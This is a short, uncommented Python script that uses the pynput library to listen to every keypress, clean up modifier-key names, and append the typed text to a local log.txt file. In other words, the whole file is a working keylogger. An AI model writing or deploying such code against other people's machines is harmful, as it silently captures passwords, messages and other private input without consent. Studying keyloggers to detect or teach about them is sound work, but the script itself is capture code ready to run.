from pynput.keyboard import Listener

def write_to_file(key):
	letter = str(key)
	letter = letter.replace("'","")

	if letter == "Key.space":
		letter = letter.replace("Key.space"," ")
	if letter == "Key.shift_r":
		letter = letter.replace("Key.shift_r","")
	if letter == "Key.shift_l":
		letter = letter.replace("Key.shift_l","")
	if letter == "Key.ctrl_l":
		letter = letter.replace("Key.ctrl_l","")
	if letter == "Key.ctrl_r":
		letter = letter.replace("Key.ctrl_r","")
	if letter == "Key.alt_l":
		letter = letter.replace("Key.alt_l","")
	if letter == "Key.alt_gr":
		letter = letter.replace("Key.alt_gr","")
	if letter == "Key.enter":
		letter = '\n'

	with open("log.txt", 'a') as f:
		f.write(letter)

with Listener(on_press=write_to_file) as l:
	l.join()